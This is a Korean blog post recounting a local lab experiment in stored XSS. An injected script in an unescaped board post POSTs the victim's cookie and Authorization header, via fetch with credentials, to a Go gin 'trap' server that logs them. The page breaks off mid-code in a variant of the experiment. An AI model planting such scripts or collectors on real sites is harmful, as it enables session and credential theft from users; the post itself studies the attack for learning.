<!DOCTYPE html><html lang="ko-KR" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="CORS를 이용한 XSS 공격 실험(카카오 로그인)" /><meta property="og:locale" content="ko_KR" /><meta name="description" content="개요 CORS에 대해 알아가다 보니 이를 이용하여 악의적인 스크립트로 사용자 인증 정보를 공격자 서버로 보낼 수도 있겠다(XSS 공격)라는 생각이 들었다. 그래서 예시를 작성해 실험해보았다. gonic-gin CORS 처리" /><meta property="og:description" content="개요 CORS에 대해 알아가다 보니 이를 이용하여 악의적인 스크립트로 사용자 인증 정보를 공격자 서버로 보낼 수도 있겠다(XSS 공격)라는 생각이 들었다. 그래서 예시를 작성해 실험해보았다. gonic-gin CORS 처리" /><link rel="canonical" href="https://a3magic3pocket.github.io/posts/xss-cors-example/" /><meta property="og:url" content="https://a3magic3pocket.github.io/posts/xss-cors-example/" /><meta property="og:site_name" content="의사줌치" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-27T18:01:00+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CORS를 이용한 XSS 공격 실험(카카오 로그인)" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"개요 CORS에 대해 알아가다 보니 이를 이용하여 악의적인 스크립트로 사용자 인증 정보를 공격자 서버로 보낼 수도 있겠다(XSS 공격)라는 생각이 들었다. 그래서 예시를 작성해 실험해보았다. gonic-gin CORS 처리","url":"https://a3magic3pocket.github.io/posts/xss-cors-example/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://a3magic3pocket.github.io/posts/xss-cors-example/"},"headline":"CORS를 이용한 XSS 공격 실험(카카오 로그인)","dateModified":"2021-08-30T09:13:39+09:00","datePublished":"2021-08-27T18:01:00+09:00","@context":"https://schema.org"}</script><title>CORS를 이용한 XSS 공격 실험(카카오 로그인) | 의사줌치</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="의사줌치"><meta name="application-name" content="의사줌치"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-5NQ41XXW83"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-5NQ41XXW83'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/avatar-crop.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">의사줌치</a></div><div class="site-subtitle font-italic">부정확한 정보를 <br /> 담고 있을 수 있습니다.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/a3magic3pocket" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['a3magic3pocket','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>CORS를 이용한 XSS 공격 실험(카카오 로그인)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CORS를 이용한 XSS 공격 실험(카카오 로그인)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 의사줌치 </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 27, 2021, 6:01 PM +0900" prep="on" > Aug 27, 2021 <i class="unloaded">2021-08-27T18:01:00+09:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Aug 30, 2021, 9:13 AM +0900" prefix="Updated " > Aug 30, 2021 <i class="unloaded">2021-08-30T09:13:39+09:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3023 words">16 min</span></div></div><div class="post-content"><h2 id="개요">개요</h2><ul><li>CORS에 대해 알아가다 보니 이를 이용하여 악의적인 스크립트로<br /> 사용자 인증 정보를 공격자 서버로 보낼 수도 있겠다(XSS 공격)라는 생각이 들었다.<li>그래서 예시를 작성해 실험해보았다.<li><a href="https://a3magic3pocket.github.io/posts/cors/">gonic-gin CORS 처리</a></ul><h2 id="xsscross-stie-scripting">XSS(Cross-stie scripting)</h2><ul><li>정의(<a href="https://developer.mozilla.org/ko/docs/Learn/Server-side/First_steps/Website_security#%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85_(cross-site_scripting_xss)">MDN 문서에서 아래 내용 발췌</a>)<ul><li>XSS는 공격자가 클라이언트 측 스크립트를 웹 사이트에 삽입하여<br /> 다른 사용자의 부라우저에서 수행되게 하는 공격의 유형을 말한다.<li>삽입된 코드는 웹 사이트에서 피해 사용자의 브라우저로 전송이 됨으로<br /> 피해 사용자에게 의심받지 않는다.<li>따라서, 그 삽입된 코드는 피해 사용자의 사이트 권한 쿠키를 공격자에게<br /> 보내는 종류의 악성 작업을 수행할 수 있다.<li>그리고 그것을 전달 받은 공격자는 마치 피해 사용자인 것처럼 위장하여 사이트에<br /> 로그인하고 피해 사용자가 할 수 있는 모든 작업을 수행할 수 있다.</ul><li>XSS의 특징<ul><li>XSS를 완벽히 막는 방법은 없고 매우 막기 힘든 것으로 알고 있다.<li><a href="http://blog.plura.io/?p=7614">XSS 대응방안</a></ul></ul><h2 id="실험개요">실험개요</h2><ul><li>실험 참여자<ul><li>보안이 허술한 게시판 서버 A(이하 게시판A)와 악의적인 공격자 서버 B(이하 공격자B)가 있다.</ul><li>게시판A 설명<ul><li>게시판A는 사용자에게 게시글을 입력 받아 다른 사용자에게 보여주는 게시판이다.<li>게시판A는 보안이 허술하여 게시글을 보여줄때 어떠한 escape 처리 없이, 게시글을 그대로 렌더한다.<br /> 예를들어 ‘&lt;div&gt;나 게시글이오&lt;/div&gt;’를 사용자가 입력했으면 ‘나 게시글이오’라고 보여진다.</ul><li>공격자B 설명<ul><li>공격자B는 게시판A에 직접 가입하여 게시판A의 인증방법을 미리 알고 있다.<li>공격자B는 게시판A의 인증방법에 맞춰 CORS 처리를 해둔 서버 세팅을 해두었다.<li>공격자B는 게시판A에 인증정보를 전송하는 스크립트 코드로 된 게시글을 게시한다.<li>이제 게시판A 유저들은 공격자B의 게시글을 보는 순간 스크립트 코드가 실행된다.</ul></ul><h2 id="실험목적">실험목적</h2><ul><li>공격자B의 공격이 실행되었을때 게시판A의 인증정보가 넘어오는지 확인한다.<li>게시판A의 인증정보는 Cookie와 Authorization 헤더에 담겼다고 가정한다.</ul><h2 id="실험환경">실험환경</h2><ul><li>예시 소스 코드(<a href="https://github.com/a3magic3pocket/xxs-cors-example">참고</a>)<li>상황<ul><li>게시판A 호스트: localhost:8888<li>공격자B 호스트: localhost:8889<li>게시판A에서 공격자B의 글 조회 URL: http://localhost:8888/victim/community<li>공격자B의 함정 endpoint<ul><li>method: POST<li>endpoint: /trap</ul></ul><li>게시판A에서 공격자B의 글 조회 html<ul><li><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre>  {{ define "victim-community.html" }}

  <span class="cp">&lt;!DOCTYPE html&gt;</span>
  <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"ko"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;head&gt;</span>
      <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;title&gt;</span>보안 허술 게시판<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
      <span class="nt">&lt;div&gt;</span>게시글 본문<span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div&gt;</span>제목: 이 글 보면 좋은 일 생김<span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div&gt;</span>
        내용: 없음
        <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
          <span class="kd">const</span> <span class="nx">baseURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost:8889</span><span class="dl">"</span><span class="p">;</span>
          <span class="kd">const</span> <span class="nx">testURL</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">baseURL</span><span class="p">}</span><span class="s2">/trap`</span><span class="p">;</span>

          <span class="kd">function</span> <span class="nx">setCookie</span><span class="p">()</span> <span class="p">{</span>
            <span class="c1">// 참고 : https://cofs.tistory.com/363</span>
            <span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
            <span class="nx">date</span><span class="p">.</span><span class="nx">setTime</span><span class="p">(</span><span class="nx">date</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
            <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s2">`auth=1; expires=' + </span><span class="p">${</span><span class="nx">date</span><span class="p">.</span><span class="nx">toUTCString</span><span class="p">()}</span><span class="s2">; path=/`</span><span class="p">;</span>
          <span class="p">}</span>

          <span class="kd">function</span> <span class="nx">testPost</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">setCookie</span><span class="p">();</span>

            <span class="nx">fetch</span><span class="p">(</span><span class="nx">testURL</span><span class="p">,</span> <span class="p">{</span>
              <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
              <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
                <span class="na">Authorization</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bearer auth2</span><span class="dl">"</span><span class="p">,</span>
              <span class="p">},</span>
              <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
            <span class="p">})</span>
              <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
              <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">responseJson</span><span class="p">)</span> <span class="o">=&gt;</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Response</span><span class="dl">"</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">responseJson</span><span class="p">))</span>
              <span class="p">)</span>
              <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="nx">error</span><span class="p">));</span>
          <span class="p">}</span>

          <span class="nx">testPost</span><span class="p">();</span>
        <span class="nt">&lt;/script&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
  <span class="nt">&lt;/html&gt;</span>

  {{ end }}
</pre></table></code></div></div></ul><li>공격자B의 라우터<ul><li><div class="language-golang highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>  <span class="k">package</span> <span class="n">main</span>

  <span class="k">import</span> <span class="p">(</span>
    <span class="s">"fmt"</span>
    <span class="s">"net/http"</span>
    <span class="s">"time"</span>

    <span class="s">"github.com/gin-contrib/cors"</span>
    <span class="s">"github.com/gin-gonic/gin"</span>
  <span class="p">)</span>

  <span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">router</span> <span class="o">:=</span> <span class="n">gin</span><span class="o">.</span><span class="n">Default</span><span class="p">()</span>

    <span class="n">router</span><span class="o">.</span><span class="n">Use</span><span class="p">(</span><span class="n">cors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span>
      <span class="n">cors</span><span class="o">.</span><span class="n">Config</span><span class="p">{</span>
        <span class="n">AllowOrigins</span><span class="o">:</span>     <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">"http://localhost:8888"</span><span class="p">},</span>
        <span class="n">AllowMethods</span><span class="o">:</span>     <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">"POST"</span><span class="p">},</span>
        <span class="n">AllowHeaders</span><span class="o">:</span>     <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">"Origin"</span><span class="p">,</span> <span class="s">"Cookie"</span><span class="p">,</span> <span class="s">"Authorization"</span><span class="p">},</span>
        <span class="n">AllowCredentials</span><span class="o">:</span> <span class="no">true</span><span class="p">,</span>
        <span class="n">MaxAge</span><span class="o">:</span>           <span class="m">12</span> <span class="o">*</span> <span class="n">time</span><span class="o">.</span><span class="n">Hour</span><span class="p">,</span>
      <span class="p">}))</span>

    <span class="n">router</span><span class="o">.</span><span class="n">POST</span><span class="p">(</span><span class="s">"trap"</span><span class="p">,</span> <span class="k">func</span><span class="p">(</span><span class="n">c</span> <span class="o">*</span><span class="n">gin</span><span class="o">.</span><span class="n">Context</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Cookie"</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="n">Request</span><span class="o">.</span><span class="n">Header</span><span class="p">[</span><span class="s">"Cookie"</span><span class="p">])</span>
      <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Authorization"</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="n">Request</span><span class="o">.</span><span class="n">Header</span><span class="p">[</span><span class="s">"Authorization"</span><span class="p">])</span>
      <span class="n">c</span><span class="o">.</span><span class="n">JSON</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">StatusOK</span><span class="p">,</span> <span class="n">gin</span><span class="o">.</span><span class="n">H</span><span class="p">{</span><span class="s">"code"</span><span class="o">:</span> <span class="m">0</span><span class="p">,</span> <span class="s">"msg"</span><span class="o">:</span> <span class="s">"success"</span><span class="p">})</span>
    <span class="p">})</span>

    <span class="n">router</span><span class="o">.</span><span class="n">Run</span><span class="p">(</span><span class="s">":8889"</span><span class="p">)</span>
  <span class="p">}</span>
</pre></table></code></div></div></ul><li>실행방법<ul><li>게시판A 서버 실행<ul><li><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  <span class="c"># 새 bash shell을 엶</span>
  <span class="nb">cd </span>victim_server
  go run main.go
</pre></table></code></div></div></ul><li>공격자B 서버 실행<ul><li><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  <span class="c"># 새 bash shell을 엶</span>
  <span class="nb">cd </span>attacker_server
  go run main.go
</pre></table></code></div></div></ul><li>브라우저에서 script의 fetchAPI를 이용하여 공격자B 서버에 POST 요청<ul><li>브라우저를 켬<li>http://localhost:8888/victim/community 로 접속<li>(접속하면 자동으로 http://localhost:8889/trap 으로 POST 요청됨)<li>공격자B 서버 bash shell을 관찰하여 endpoint trap에 요청이 들어왔는지 확인<br /> 그리고 요청에 담긴 Cookie 헤더와 Authorization 헤더 값을 확인</ul></ul></ul><h2 id="실험결과">실험결과</h2><ul><li>공격 성공<ul><li>게시판A 사용자의 Cookie와 Authorization 헤더가 공격자B 서버로 넘어왔다.<li>게시판A 사용자의 네트워크 처리 상황<ul><li><a href="/assets/img/2021-08-27-xss-cors-example/00-request-trap-success.jpg" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2021-08-27-xss-cors-example/00-request-trap-success.jpg" width="100%" /></a></ul><li>공격자B 서버 쉘 로그<ul><li><a href="/assets/img/2021-08-27-xss-cors-example/01-listen-trap-request-success.jpg" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2021-08-27-xss-cors-example/01-listen-trap-request-success.jpg" width="100%" /></a></ul></ul></ul><h2 id="실험변형-1-공격자b의-hostname-변경">실험변형 1. 공격자B의 hostname 변경</h2><ul><li>실험의 맹점<ul><li>사실 이 실험에는 맹점이 있다.<li>공격자B가 올린 게시글의 악성스크립트를 보면<br /> AJAX 요청 목적지인 공격자B의 hostname와<br /> AJAX 요청 주체인 게시판A의 hostname이 ‘localhost’로 동일한 것을 알 수 있다.<br /> (공격자B의 endpoint: POST; http://localhost:8889/trap,<br /> 게시판A의 게시글 url: http://localhost:8888/victim/community)<li>이 경우 브라우저에서 볼때, 게시판A의 서버와 공격자B의 서버가 같다고 인식하게 된다.<li>따라서 <a href="https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy#%EA%B5%90%EC%B0%A8_%EC%B6%9C%EC%B2%98_%EB%8D%B0%EC%9D%B4%ED%84%B0_%EC%A0%80%EC%9E%A5%EC%86%8C_%EC%A0%91%EA%B7%BC">쿠키의 동일출처정책</a>에 의하여 게시판A에서 할당한 쿠키가 공격자B로 넘어가게 된다.<li>만약 AJAX 요청 시 공격자B의 hostname을 다르게 설정하면 어떨까?<br /> (실제 상황이라면 다를 것이기 때문)</ul><li>실험환경 수정<ul><li>아래 부분만 수정한 뒤, 이전 실험과 동일한 방법으로 실행한다.<li>게시판A에서 공격자B의 글 조회 html<ul><li><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre>  {{ define "victim-community.html" }}

  <span class="cp">&lt;!DOCTYPE html&gt;</span>
  <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"ko"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;head&gt;</span>
      <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;title&gt;</span>보안 허술 게시판<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
      <span class="nt">&lt;div&gt;</span>게시글 본문<span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div&gt;</span>제목: 이 글 보면 좋은 일 생김<span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div&gt;</span>
        내용: 없음
        <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
          <span class="c1">// </span><span class="o">&lt;&lt;&lt;</span> <span class="o">--</span> <span class="nx">변경</span> <span class="nx">내역</span> <span class="nx">시작</span> <span class="o">--</span> <span class="o">&lt;&lt;&lt;</span>
          <span class="c1">// const baseURL = "http://localhost:8889";</span>
          <span class="kd">const</span> <span class="nx">baseURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://127.0.0.1:8889</span><span class="dl">"</span><span class="p">;</span>
          <span class="c1">// &gt;&gt;&gt; -- 변경 내역 끝 -- &gt;&gt;&gt;</span>
          <span class="kd">const</span> <span class="nx">testURL</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">baseURL</span><span class="p">}</span><span class="s2">/trap`</span><span class="p">;</span>

          <span class="kd">function</span> <span class="nx">setCookie</span><span class="p">()</span> <span class="p">{</span>
            <span class="c1">// 참고 : https://cofs.tistory.com/363</span>
            <span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
            <span class="nx">date</span><span class="p">.</span><span class="nx">setTime</span><span class="p">(</span><span class="nx">date</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
            <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s2">`auth=1; expires=' + </span><span class="p">${</span><span class="nx">date</span><span class="p">.</span><span class="nx">toUTCString</span><span class="p">()}</span><span class="s2">; path=/`</span><span class="p">;</span>
          <span class="p">}</span>

          <span class="kd">function</span> <span class="nx">testPost</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">setCookie</span><span class="p">();</span>

            <span class="nx">fetch</span><span class="p">(</span><span class="nx">testURL</span><span class="p">,</span> <span class="p">{</span>
              <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
              <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
                <span class="na">Authorization</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Bearer auth2</span><span class="dl">"</span><span class="p">,</span>
              <span class="p">},</span>
              <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
            <span class="p">})</span>
              <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
              <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">responseJson</span><span class="p">)</span> <span class="o">=&gt;</span>
